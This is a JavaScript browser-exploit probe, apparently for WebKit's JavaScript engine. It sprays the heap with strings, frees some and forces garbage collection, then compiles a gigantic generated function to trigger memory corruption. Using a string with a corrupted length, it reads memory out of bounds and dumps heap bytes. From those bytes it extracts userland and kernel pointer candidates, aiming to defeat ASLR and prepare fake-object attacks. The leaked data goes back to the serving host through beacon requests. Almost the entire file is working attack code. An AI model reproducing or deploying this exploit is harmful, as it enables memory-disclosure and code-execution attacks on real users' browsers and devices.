// p54g — Extended OOB heap scan via corrupted JSString
//
// Based on p146/p156 which achieved .length=81400 on 100K strings.
// Those probes only checked early offsets. This probe scans the FULL
// OOB region (bytes 100000–181399) looking for heap metadata:
//   - Non-0x41 values = adjacent heap object data
//   - Pointer-shaped values (8 bytes, aligned) = vtables, Structure*, Butterfly*
//   - Repeated patterns = MarkedBlock headers or free-list entries
//
// If we find a vtable pointer, we can compute WebKit's ASLR base.
// If we find heap metadata, we know the layout for fake-object attacks.
//
// Beacon prefix: V54G-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V54G-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };
  var BP = function(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V54G-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch(e) {}
  };

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V54G-W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch(e) {}
    }
    function beaconPost(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V54G-W-' + tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } catch(e) {}
    }

    // Reconstruct a 64-bit hex string from 8 charCodeAt values (little-endian)
    function ptr64(str, off) {
      var hex = '';
      for (var i = 7; i >= 0; i--) {
        var v = str.charCodeAt(off + i);
        hex += (v < 16 ? '0' : '') + v.toString(16);
      }
      return hex;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var count = e.data.count;
        for (var i = 0; i < count; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');

        // Wait for corruption
        var found = false;
        var iterations = 0;
        while (!found) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) { found = true; break; }
            if (targets[i].charCodeAt(8) !== CANARY) { found = true; break; }
          }
          iterations++;
          if (iterations % 500000 === 0) beacon('POLL-' + iterations);
        }

        beacon('CORRUPTED-iter=' + iterations);

        // Find a string with header-corrupted length > STR_LEN (OOB read candidate)
        var oobIdx = -1;
        var oobLen = 0;
        for (var i = 0; i < targets.length; i++) {
          var len = targets[i].length;
          if (len > STR_LEN && len < 1000000) {
            oobIdx = i;
            oobLen = len;
            break;
          }
        }

        if (oobIdx < 0) {
          // No length-corrupted string — try data-corrupted ones with intact headers
          // These can still read within STR_LEN but with corrupted data
          beacon('NO-OOB-LEN');

          // Still scan the last strings for any non-canary data near the boundary
          for (var i = targets.length - 1; i >= 0; i--) {
            if (targets[i].length !== STR_LEN) continue;
            // Check last 1000 bytes of string for non-canary
            var foundData = false;
            for (var b = STR_LEN - 1000; b < STR_LEN; b += 8) {
              if (targets[i].charCodeAt(b) !== CANARY) { foundData = true; break; }
            }
            if (foundData) {
              beacon('TAIL-DATA-str=' + i);
              // Dump last 256 bytes
              var hex = '';
              for (var b = STR_LEN - 256; b < STR_LEN; b++) {
                var v = targets[i].charCodeAt(b);
                hex += (v < 16 ? '0' : '') + v.toString(16);
              }
              beaconPost('TAIL-' + i, hex);
            }
          }
          beacon('DONE-NO-OOB');
          return;
        }

        beacon('OOB-str=' + oobIdx + '-len=' + oobLen);

        // === MAIN OOB SCAN ===
        // Scan from STR_LEN to oobLen, looking for non-zero non-0x41 data
        // This reads PAST the original string into adjacent heap objects

        var scanStart = STR_LEN;
        var scanEnd = Math.min(oobLen, STR_LEN + 80000); // cap at 80KB OOB
        var ptrCount = 0;

        // Phase A: Find regions with non-canary data
        var regions = [];
        var inRegion = false;
        var regionStart = 0;
        for (var b = scanStart; b < scanEnd; b += 16) {
          var v = 0;
          try { v = targets[oobIdx].charCodeAt(b); } catch(e) { break; }
          var isData = (v !== 0 && v !== CANARY);
          if (isData && !inRegion) { inRegion = true; regionStart = b; }
          if (!isData && inRegion) { inRegion = false; regions.push([regionStart, b]); }
        }
        if (inRegion) regions.push([regionStart, scanEnd]);

        beacon('REGIONS-' + regions.length);

        // Phase B: Dump each region (up to first 20) and extract pointer-like values
        for (var r = 0; r < Math.min(regions.length, 20); r++) {
          var rs = regions[r][0];
          var re = Math.min(regions[r][1], rs + 512); // cap dump at 512 bytes per region
          beacon('R' + r + '-off=' + rs + '-len=' + (re - rs));

          // Dump hex
          var hex = '';
          for (var b = rs; b < re; b++) {
            try {
              var v = targets[oobIdx].charCodeAt(b);
              hex += (v < 16 ? '0' : '') + v.toString(16);
            } catch(e) { hex += 'XX'; break; }
          }
          beaconPost('RD' + r, hex);

          // Extract 8-byte aligned pointer candidates
          for (var b = rs; b < re - 7; b += 8) {
            var p = ptr64(targets[oobIdx], b);
            // Check for pointer-like values:
            // Userland: 0x0000xxxx_xxxxxxxx (non-zero, > 0x10000)
            // Kernel:   0xFFFF8xxx_xxxxxxxx
            var hi = parseInt(p.substring(0, 8), 16);
            var lo = parseInt(p.substring(8, 16), 16);
            if (hi === 0 && lo === 0) continue;
            if (hi === 0x41414141 && lo === 0x41414141) continue; // canary

            if ((hi >= 0x00000001 && hi <= 0x00007fff) ||   // userland ptr
                (hi >= 0xffff8000 && hi < 0xffffffff)) {     // kernel ptr
              ptrCount++;
              var label = (hi >= 0xffff8000) ? 'KPTR' : 'UPTR';
              beacon(label + '-off=' + b + '-' + p);
            }
          }
        }

        beacon('PTRS-' + ptrCount);

        // Phase C: Quick scan for kernel pointers across entire OOB range
        // (even outside identified regions, in case we missed sparse data)
        var kptrScan = 0;
        for (var b = scanStart; b < scanEnd - 7; b += 8) {
          try {
            var b7 = targets[oobIdx].charCodeAt(b + 7);
            var b6 = targets[oobIdx].charCodeAt(b + 6);
            // Quick check: kernel ptrs have 0xff 0xff at bytes 6-7 (LE)
            if (b7 === 0xff && b6 === 0xff) {
              var p = ptr64(targets[oobIdx], b);
              var hi = parseInt(p.substring(0, 8), 16);
              if (hi >= 0xffff8000 && hi < 0xffffffff) {
                kptrScan++;
                beacon('KP-off=' + b + '-' + p);
                if (kptrScan >= 50) break; // enough
              }
            }
          } catch(e) { break; }
        }

        beacon('KSCAN-' + kptrScan);
        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS ──
  var N_BAIT = 20;
  var STR_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', count: 14 });

  // ── PHASE 3: FREE + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;
    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-' + gcRound); phaseBuildOverflow(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: OVERFLOW ──
  function phaseBuildOverflow() {
    B('BUILD');
    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;
    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';
    var parts = ['window.__v54gfn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v54gok=true;');
    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null; remChunk = null; parts = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__v54gok ? 'OK' : 'FAIL'));
      if (!window.__v54gfn) { B('NO-FN'); return; }
      worker.postMessage({ cmd: 'watch' });
      setTimeout(function() {
        B('CALLING');
        try { window.__v54gfn(function(){}); } catch(ex) { B('CATCH-' + (ex.message || '').substring(0, 30)); }
        B('SURVIVED');
      }, 200);
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
